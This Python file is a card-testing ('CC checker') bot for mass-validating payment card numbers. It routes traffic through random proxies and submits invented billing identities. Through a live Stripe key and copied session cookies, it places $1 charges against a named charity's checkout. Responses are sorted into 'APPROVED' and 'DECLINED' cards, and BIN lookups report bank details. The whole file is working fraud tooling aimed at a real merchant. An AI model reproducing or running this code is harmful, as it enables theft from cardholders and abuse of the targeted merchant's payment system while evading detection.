import requests
import random
import time
import threading

def random_name():
    first_names = ['James', 'John', 'Robert', 'Michael', 'William', 'David', 'Richard', 'Charles', 'Joseph', 'Thomas']
    last_names = ['Smith', 'Johnson', 'Williams', 'Brown', 'Jones', 'Miller', 'Davis', 'Garcia', 'Rodriguez', 'Wilson']
    return f"{random.choice(first_names)} {random.choice(last_names)}"

def random_email(name):
    domains = ['gmail.com', 'yahoo.com', 'hotmail.com']
    name_part = name.lower().replace(' ', '.')
    return f"{name_part}{random.randint(100, 999)}@{random.choice(domains)}"

def random_phone():
    return f"+1{random.randint(200, 999)}{random.randint(100, 999)}{random.randint(1000, 9999)}"

def random_address():
    streets = ['Main St', 'Oak Ave', 'Maple Dr', 'Elm St', 'Pine Rd']
    cities_states_zips = [
        ('New York', 'NY', '10001'),
        ('Los Angeles', 'CA', '90001'),
        ('Chicago', 'IL', '60601'),
        ('Houston', 'TX', '77001'),
        ('Phoenix', 'AZ', '85001')
    ]
    city, state, zip_code = random.choice(cities_states_zips)
    street_num = random.randint(100, 9999)
    street = random.choice(streets)
    return f"{street_num} {street}", city, state, zip_code

def get_random_proxy():
    """Get a random proxy from proxy.txt file"""
    try:
        with open('proxy.txt', 'r') as f:
            proxies = f.readlines()
            if not proxies:
                return None
            proxy = random.choice(proxies).strip()

            parts = proxy.split(':')
            if len(parts) == 4:
                host, port, username, password = parts
                proxy_dict = {
                    'http': f'http://{username}:{password}@{host}:{port}',
                    'https': f'http://{username}:{password}@{host}:{port}'
                }
                return proxy_dict
            elif len(parts) == 2:
                host, port = parts
                proxy_dict = {
                    'http': f'http://{host}:{port}',
                    'https': f'http://{host}:{port}'
                }
                return proxy_dict
            return None
    except:
        return None

# BIN lookup function - UPDATED with multiple reliable APIs
def get_bin_info(bin_number):
    """Get BIN information using multiple reliable APIs with fallback"""
    if not bin_number or len(bin_number) < 6:
        return {
            'bank': 'Unavailable',
            'country': 'Unknown',
            'brand': 'Unknown',
            'type': 'Unknown',
            'level': 'Unknown',
            'emoji': '🏳️'
        }
    
    bin_code = bin_number[:6]
    
    # Try multiple APIs in sequence
    apis_to_try = [
        f"https://lookup.binlist.net/{bin_code}",
        f"https://bin-ip-checker.p.rapidapi.com/?bin={bin_code}",
        f"https://bins.antipublic.cc/bins/{bin_code}",
    ]
    
    headers = {
        'Accept': 'application/json',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
    }
    
    for api_url in apis_to_try:
        try:
            print(f"Trying BIN API: {api_url}")
            response = requests.get(api_url, headers=headers, timeout=10, verify=False)
            
            if response.status_code == 200:
                data = response.json()
                bin_info = {}
                
                # Parse based on API response format
                if 'binlist.net' in api_url:
                    # binlist.net format
                    bin_info = {
                        'bank': data.get('bank', {}).get('name', 'Unavailable'),
                        'country': data.get('country', {}).get('name', 'Unknown'),
                        'brand': data.get('scheme', 'Unknown'),
                        'type': data.get('type', 'Unknown'),
                        'level': data.get('brand', 'Unknown'),
                        'emoji': get_country_emoji(data.get('country', {}).get('alpha2', ''))
                    }
                elif 'antipublic.cc' in api_url:
                    # antipublic.cc format
                    bin_info = {
                        'bank': data.get('bank', 'Unavailable'),
                        'country': data.get('country', 'Unknown'),
                        'brand': data.get('vendor', 'Unknown'),
                        'type': data.get('type', 'Unknown'),
                        'level': data.get('level', 'Unknown'),
                        'emoji': get_country_emoji(data.get('country_code', ''))
                    }
                else:
                    # Generic format
                    bin_info = {
                        'bank': data.get('bank', {}).get('name', data.get('bank_name', 'Unavailable')),
                        'country': data.get('country', {}).get('name', data.get('country_name', 'Unknown')),
                        'brand': data.get('scheme', data.get('brand', 'Unknown')),
                        'type': data.get('type', data.get('card_type', 'Unknown')),
                        'level': data.get('level', data.get('card_level', 'Unknown')),
                        'emoji': get_country_emoji(data.get('country', {}).get('code', data.get('country_code', '')))
                    }
                
                # Clean up the values
                for key in ['bank', 'country', 'brand', 'type', 'level']:
                    if not bin_info.get(key) or bin_info[key] in ['', 'N/A', 'None', 'null']:
                        bin_info[key] = 'Unknown'
                
                # If we got valid data, return it
                if bin_info['bank'] not in ['Unavailable', 'Unknown'] or bin_info['brand'] != 'Unknown':
                    print(f"BIN info successfully retrieved from {api_url}")
                    return bin_info
                    
        except Exception as e:
            print(f"BIN API {api_url} failed: {str(e)}")
            continue
    
    # If all APIs failed, return default values
    print("All BIN APIs failed, using default values")
    return {
        'bank': 'Unavailable',
        'country': 'Unknown',
        'brand': 'Unknown',
        'type': 'Unknown',
        'level': 'Unknown',
        'emoji': '🏳️'
    }

def get_country_emoji(country_code):
    """Convert country code to emoji"""
    if not country_code or len(country_code) != 2:
        return '🏳️'
    
    try:
        # Convert to uppercase and get emoji
        country_code = country_code.upper()
        return ''.join(chr(127397 + ord(char)) for char in country_code)
    except:
        return '🏳️'

def check_status(response_data):
    """Check the status based on the actual site response"""
    try:
        if response_data.get("status") == "SUCCESS" or response_data.get("success") is True:
            return "APPROVED CC", "Payment successful - $1 charged", True
        
        failure_type = response_data.get("failureType", "")
        error_message = response_data.get("error", "")
        
        full_message = ""
        if failure_type:
            full_message += f"{failure_type}"
        if error_message:
            if isinstance(error_message, dict):
                full_message += f" - {error_message.get('message', '')}"
            else:
                full_message += f" - {error_message}"
        
        full_message = full_message.strip()
        if not full_message:
            full_message = "Declined"
        
        approved_patterns = ['insufficient funds', 'avs', 'duplicate', 'cvv']
        for pattern in approved_patterns:
            if pattern in full_message.lower():
                return "APPROVED CC", full_message, True
        
        return "DECLINED CC", full_message, False
        
    except:
        return "UNKNOWN", "Error parsing response", False

def test_charge(cc_line):
    start_time = time.time()
    
    try:
        time.sleep(random.uniform(1, 3))
        
        parts = cc_line.strip().split('|')
        if len(parts) < 4:
            return "❌ Invalid CC format"
        
        ccn, mm, yy, cvc = parts[0], parts[1], parts[2], parts[3]
        
        # FIRST: Get BIN information before anything else
        print("Getting BIN information...")
        bin_info = get_bin_info(ccn[:6])
        print(f"BIN Info retrieved: {bin_info}")
        
        name = random_name()
        email = random_email(name)
        phone = random_phone()
        street, city, state, zip_code = random_address()
        
        headers = {  
            'Chargeority': 'api.stripe.com',  
            'accept': 'application/json',  
            'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',  
            'content-type': 'application/x-www-form-urlencoded',  
            'origin': 'https://js.stripe.com',  
            'referer': 'https://js.stripe.com/',  
            'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',  
            'sec-ch-ua-mobile': '?1',  
            'sec-ch-ua-platform': '"Android"',  
            'sec-fetch-dest': 'empty',  
            'sec-fetch-mode': 'cors',  
            'sec-fetch-site': 'same-site',  
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',  
        }  

        data = f'billing_details[address][city]={city}&billing_details[address][country]=US&billing_details[address][line1]={street.replace(" ", "+")}&billing_details[address][line2]=&billing_details[address][postal_code]={zip_code}&billing_details[address][state]={state}&billing_details[name]={name.replace(" ", "+")}&billing_details[email]={email}&type=card&card[number]={ccn}&card[cvc]={cvc}&card[exp_year]={yy}&card[exp_month]={mm}&allow_redisplay=unspecified&pasted_fields=number&payment_user_agent=stripe.js%2F4ee0ef76c3%3B+stripe-js-v3%2F4ee0ef76c3%3B+payment-element%3B+deferred-intent&referrer=https%3A%2F%2Fwww.onamissionkc.org&time_on_page=374065&client_attribution_metadata[client_session_id]=116eab5f-5267-4f76-a605-776bfe51ace4&client_attribution_metadata[merchant_integration_source]=elements&client_attribution_metadata[merchant_integration_subtype]=payment-element&client_attribution_metadata[merchant_integration_version]=2021&client_attribution_metadata[payment_intent_creation_flow]=deferred&client_attribution_metadata[payment_method_selection_flow]=merchant_specified&client_attribution_metadata[elements_session_config_id]=2e44226d-93d9-4f56-a0ba-a29cd22089d7&guid=45b6bfde-c8ee-4183-b3f2-18806c2c7734f646c6&muid=c482f347-993d-4374-87fb-053c66058373e5eda4&sid=56f9f786-8f07-46de-9731-2ddafb8398229438e8&key=pk_live_51LwocDFHMGxIu0Ep6mkR59xgelMzyuFAnVQNjVXgygtn8KWHs9afEIcCogfam0Pq6S5ADG2iLaXb1L69MINGdzuO00gFUK9D0e&_stripe_account=acct_1LwocDFHMGxIu0Ep'  

        proxy_dict = get_random_proxy()
        
        if proxy_dict:
            response = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data, proxies=proxy_dict, timeout=30, verify=False)
        else:
            response = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data, timeout=30, verify=False)

        apx = response.json()  
        pid = apx.get("id", "FAILED")
        
        if pid == "FAILED":
            error_msg = apx.get('error', {}).get('message', 'Unknown error')
            elapsed_time = time.time() - start_time
            
            return f"""
❌ DECLINED CC

💳𝗖𝗖 ⇾ {ccn}|{mm}|{yy}|{cvc}
🚀𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ {error_msg}
💰𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Stripe $1 Charge

📚𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {bin_info.get('brand', 'UNKNOWN')} - {bin_info.get('type', 'UNKNOWN')} - {bin_info.get('level', 'UNKNOWN')}
🏛️𝗕𝗮𝗻𝗸: {bin_info.get('bank', 'UNKNOWN')}
🌎𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {bin_info.get('country', 'UNKNOWN')} {bin_info.get('emoji', '🏳️')}
🕒𝗧𝗼𝗼𝗸 {elapsed_time:.2f}𝘀

🔱𝗕𝗼𝘁 𝗯𝘆 :『@mhitzxg 帝 @pr0xy_xd』
"""

        time.sleep(random.uniform(2, 4))

        cookies = {  
            'crumb': 'Bb3llzbbHEzEZTA1NWM3Mjg5NzA4MTRiMDU4MmZjMjdmYzI5MDk1',  
            'ss_cvr': 'ss_cvr=4ce4390e-5663-4476-8fcc-3d201251d43c|1761044455597|1761044455597|1761044455597|1',  
            'ss_cvt': '1761044455597',  
            '__stripe_mid': 'c482f347-993d-4374-87fb-053c66058373e5eda4',  
            '__stripe_sid': '56f9f786-8f07-46de-9731-2ddafb8398229438e8',  
        }  

        headers = {  
            'Chargeority': 'www.onamissionkc.org',  
            'accept': 'application/json, text/plain, */*',  
            'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',  
            'content-type': 'application/json',  
            'origin': 'https://www.onamissionkc.org',  
            'referer': 'https://www.onamissionkc.org/checkout?cartToken=JwX3wgs9-diPHs5hkHWyAqx7_VGT_5Ka3F3MwRgV',  
            'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',  
            'sec-ch-ua-mobile': '?1',  
            'sec-ch-ua-platform': '"Android"',  
            'sec-fetch-dest': 'empty',  
            'sec-fetch-mode': 'cors',  
            'sec-fetch-site': 'same-origin',  
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',  
            'x-csrf-token': 'Bb3llzbbHEzEZTA1NWM3Mjg5NzA4MTRiMDU4MmZjMjdmYzI5MDk1',  
        }  

        json_data = {  
            'email': email,  
            'subscribeToList': False,  
            'shippingAddress': {  
                'id': '',  
                'firstName': '',  
                'lastName': '',  
                'line1': '',  
                'line2': '',  
                'city': '',  
                'region': state,  
                'postalCode': '',  
                'country': '',  
                'phoneNumber': '',  
            },  
            'createNewUser': False,  
            'newUserPassword': None,  
            'saveShippingAddress': False,  
            'makeDefaultShippingAddress': False,  
            'customFormData': None,  
            'shippingAddressId': None,  
            'proposedAmountDue': {  
                'decimalValue': '1',  
                'currencyCode': 'USD',  
            },  
            'cartToken': 'JwX3wgs9-diPHs5hkHWyAqx7_VGT_5Ka3F3MwRgV',  
            'paymentToken': {  
                'stripePaymentTokenType': 'PAYMENT_METHOD_ID',  
                'token': pid,  
                'type': 'STRIPE',  
            },  
            'billToShippingAddress': False,  
            'billingAddress': {  
                'id': '',  
                'firstName': name.split()[0],  
                'lastName': name.split()[1],  
                'line1': street,  
                'line2': '',  
                'city': city,  
                'region': state,  
                'postalCode': zip_code,  
                'country': 'US',  
                'phoneNumber': phone,  
            },  
            'savePaymentInfo': False,  
            'makeDefaultPayment': False,  
            'paymentCardId': None,  
            'universalPaymentElementEnabled': True,  
        }  

        if proxy_dict:
            response1 = requests.post('https://www.onamissionkc.org/api/2/commerce/orders', cookies=cookies, headers=headers, json=json_data, proxies=proxy_dict, timeout=30, verify=False)
        else:
            response1 = requests.post('https://www.onamissionkc.org/api/2/commerce/orders', cookies=cookies, headers=headers, json=json_data, timeout=30, verify=False)

        apx1 = response1.json()
        
        elapsed_time = time.time() - start_time
        
        status, reason, approved = check_status(apx1)

        return f"""
{status} {'❌' if not approved else '✅'}

💳𝗖𝗖 ⇾ {ccn}|{mm}|{yy}|{cvc}
🚀𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ {reason}
💰𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Stripe $1 Charge

📚𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {bin_info.get('brand', 'UNKNOWN')} - {bin_info.get('type', 'UNKNOWN')} - {bin_info.get('level', 'UNKNOWN')}
🏛️𝗕𝗮𝗻𝗸: {bin_info.get('bank', 'UNKNOWN')}
🌎𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {bin_info.get('country', 'UNKNOWN')} {bin_info.get('emoji', '🏳️')}
🕒𝗧𝗼𝗼𝗸 {elapsed_time:.2f}𝘀

🔱𝗕𝗼𝘁 𝗯𝘆 :『@mhitzxg 帝 @pr0xy_xd』
"""

    except Exception as e:
        elapsed_time = time.time() - start_time
        # Get BIN info even for errors to ensure we have it
        bin_info = get_bin_info(cc_line.split('|')[0][:6]) if '|' in cc_line else get_bin_info('')
        return f"""
❌ ERROR

💳𝗖𝗖 ⇾ {cc_line.strip()}
🚀𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ {str(e)}
💰𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Stripe $1 Charge

📚𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {bin_info.get('brand', 'UNKNOWN')} - {bin_info.get('type', 'UNKNOWN')} - {bin_info.get('level', 'UNKNOWN')}
🏛️𝗕𝗮𝗻𝗸: {bin_info.get('bank', 'UNKNOWN')}
🌎𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {bin_info.get('country', 'UNKNOWN')} {bin_info.get('emoji', '🏳️')}
🕒𝗧𝗼𝗼𝗸 {elapsed_time:.2f}𝘀

🔱𝗕𝗼𝘁 𝗯𝘆 :『@mhitzxg 帝 @pr0xy_xd』
"""

# Single CC check function for /st command
def check_single_cc(cc_line):
    return test_charge(cc_line)

# Mass CC check function for /mst command  
def check_mass_cc(cc_lines):
    """Process multiple CCs - keep original function signature"""
    results = []
    for cc_line in cc_lines:
        try:
            result = test_charge(cc_line.strip())
            results.append(result)
            # Add delay between requests
            time.sleep(random.uniform(2, 4))
        except Exception as e:
            results.append(f"❌ Error processing card: {str(e)}")
    
    return results
